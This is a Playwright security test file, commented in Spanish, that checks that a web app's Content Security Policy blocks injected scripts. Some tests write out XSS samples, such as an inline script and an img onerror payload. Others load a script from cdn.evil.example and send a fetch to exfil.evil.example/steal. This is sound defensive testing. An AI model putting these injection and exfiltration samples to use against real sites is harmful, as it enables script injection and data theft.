import { test, expect } from '@playwright/test';
import { instrument, cspViolations } from './_helpers.js';

// S-04 · categoría 4: la CSP del build (meta http-equiv) bloquea scripts
// inline, manejadores inline, eval y conexiones a orígenes ajenos. Las
// inyecciones se hacen desde la propia página (simulan un sumidero de HTML).
// Ninguna petición sale del runner: los orígenes ajenos usan el TLD reservado
// .example y además se abortan con page.route.

test.beforeEach(async ({ page }) => {
  await page.route(/^https?:\/\/([a-z0-9-]+\.)*example(:\d+)?\//, (r) => r.abort());
});

test('el build lleva la CSP por meta, sin unsafe-inline ni unsafe-eval', async ({ page }) => {
  await page.goto('./#/login');
  const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
  expect(csp).toContain("script-src 'self'");
  expect(csp).toContain("object-src 'none'");
  expect(csp).toContain("base-uri 'self'");
  expect(csp).toContain("form-action 'self'");
  expect(csp).not.toMatch(/unsafe-inline|unsafe-eval/);
  expect(await page.locator('meta[name="referrer"]').getAttribute('content')).toBe('no-referrer');
});

test('un <script> inline inyectado no se ejecuta', async ({ page }) => {
  const seen = await instrument(page);
  await page.goto('./#/login');
  await expect(page.getByRole('button', { name: 'Entrar' })).toBeVisible();
  await page.evaluate(() => {
    const s = document.createElement('script');
    s.textContent = "window.__pwned = 'inline'; alert('csp-inline')";
    document.body.append(s);
  });
  await page.waitForTimeout(300);
  expect(await page.evaluate(() => window.__pwned)).toBeUndefined();
  expect(seen.dialogs).toEqual([]);
  const v = await cspViolations(page);
  expect(v.some((x) => x.directive === 'script-src-elem')).toBe(true);
});

test('un manejador inline (<img onerror>) inyectado como HTML no se ejecuta', async ({ page }) => {
  const seen = await instrument(page);
  await page.goto('./#/login');
  await expect(page.getByRole('button', { name: 'Entrar' })).toBeVisible();
  await page.evaluate(() => {
    const d = document.createElement('div');
    // Simula un sumidero de HTML; la app no usa ninguno (front-f05.test.js lo vigila).
    d.insertAdjacentHTML('beforeend', '<img src="x" onerror="window.__pwned=\'onerror\';alert(1)">');
    document.body.append(d);
  });
  await page.waitForTimeout(500);
  expect(await page.evaluate(() => window.__pwned)).toBeUndefined();
  expect(seen.dialogs).toEqual([]);
  const v = await cspViolations(page);
  expect(v.some((x) => x.directive === 'script-src-attr')).toBe(true);
});

test('eval por cadena (setTimeout con string) queda bloqueado', async ({ page }) => {
  await instrument(page);
  await page.goto('./#/login');
  await expect(page.getByRole('button', { name: 'Entrar' })).toBeVisible();
  await page.evaluate(() => {
    // El temporizador con cadena se compila en el contexto de la página, sujeto a la CSP.
    window.setTimeout("window.__pwned = 'eval'", 0);
  });
  await page.waitForTimeout(300);
  expect(await page.evaluate(() => window.__pwned)).toBeUndefined();
  const v = await cspViolations(page);
  expect(v.some((x) => x.directive === 'script-src' && x.blocked === 'eval')).toBe(true);
});

test('un script de otro origen queda bloqueado', async ({ page }) => {
  await instrument(page);
  await page.goto('./#/login');
  await expect(page.getByRole('button', { name: 'Entrar' })).toBeVisible();
  await page.evaluate(() => {
    const s = document.createElement('script');
    s.src = 'https://cdn.evil.example/x.js';
    document.head.append(s);
  });
  await page.waitForTimeout(300);
  const v = await cspViolations(page);
  expect(v.some((x) => x.directive === 'script-src-elem' && /evil\.example/.test(x.blocked))).toBe(true);
});

test('connect-src: fetch a un origen ajeno se bloquea antes de salir', async ({ page }) => {
  await instrument(page);
  await page.goto('./#/login');
  const result = await page.evaluate(() =>
    fetch('https://exfil.evil.example/steal?t=1').then(() => 'sent', () => 'blocked'),
  );
  expect(result).toBe('blocked');
  const v = await cspViolations(page);
  expect(v.some((x) => x.directive === 'connect-src' && /evil\.example/.test(x.blocked))).toBe(true);
});

test('la app arranca sin violaciones de CSP propias', async ({ page }) => {
  const seen = await instrument(page);
  await page.goto('./#/login');
  await expect(page.getByRole('button', { name: 'Entrar' })).toBeVisible();
  await page.waitForTimeout(300);
  expect(await cspViolations(page)).toEqual([]);
  expect(seen.console.filter((t) => /Content Security Policy/i.test(t))).toEqual([]);
});
